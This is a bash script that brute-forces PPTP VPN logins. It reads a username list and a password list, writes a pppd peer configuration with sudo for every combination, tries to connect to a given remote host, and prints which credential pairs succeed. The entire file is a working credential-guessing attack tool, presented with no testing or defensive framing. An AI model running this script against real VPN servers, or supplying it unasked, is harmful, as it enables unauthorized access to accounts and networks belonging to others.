#!/bin/bash

# Check if the required arguments are provided
if [ "$#" -ne 3 ]; then
  echo "Usage: $0 <username_file> <password_file> <remote_host>"
  exit 1
fi

# Get the arguments
username_file="$1"
password_file="$2"
remote_host="$3"

# Define the connection details
pptp_connection="your_pptp_connection_name"


# Read usernames from the username text file
usernames=()
while IFS= read -r username || [[ -n "$username" ]]; do
  usernames+=("$username")
done < "$username_file"

# Read passwords from the password text file
passwords=()
while IFS= read -r password || [[ -n "$password" ]]; do
  passwords+=("$password")
done < "$password_file"

# Function to disconnect the PPTP interface
disconnect_interface() {
  if ifconfig | grep -q "ppp0"; then
    sudo poff $pptp_connection
  fi
}

# Flag to track connection success
connection_success=false

# Iterate over usernames and passwords to establish connections
for username in "${usernames[@]}"; do
  for password in "${passwords[@]}"; do
    # Create the PPTP configuration file
    echo "pty \"pptp $remote_host --nolaunchpppd\"" | sudo tee /etc/ppp/peers/$pptp_connection > /dev/null
    echo "name $username" | sudo tee -a /etc/ppp/peers/$pptp_connection > /dev/null
    echo "password $password" | sudo tee -a /etc/ppp/peers/$pptp_connection > /dev/null
    echo "remotename PPTP" | sudo tee -a /etc/ppp/peers/$pptp_connection > /dev/null
    echo "require-mppe-128" | sudo tee -a /etc/ppp/peers/$pptp_connection > /dev/null
    echo "file /etc/ppp/options.pptp" | sudo tee -a /etc/ppp/peers/$pptp_connection > /dev/null
    echo "ipparam $pptp_connection" | sudo tee -a /etc/ppp/peers/$pptp_connection > /dev/null

    # Disconnect previous interface, if any
    disconnect_interface

    # Connect to the remote host
    sudo pon $pptp_connection

    # Wait for the connection to establish
    sleep 5

    # Check if the connection was successful
    if ifconfig | grep -q "ppp0"; then
      echo "success $username $password "
      connection_success=true
    else
      echo "failed $username $password "
    fi

    # Remove the PPTP configuration file
    sudo rm /etc/ppp/peers/$pptp_connection
  done
done

if ! "$connection_success"; then
  echo "No valid connection could be established."
fi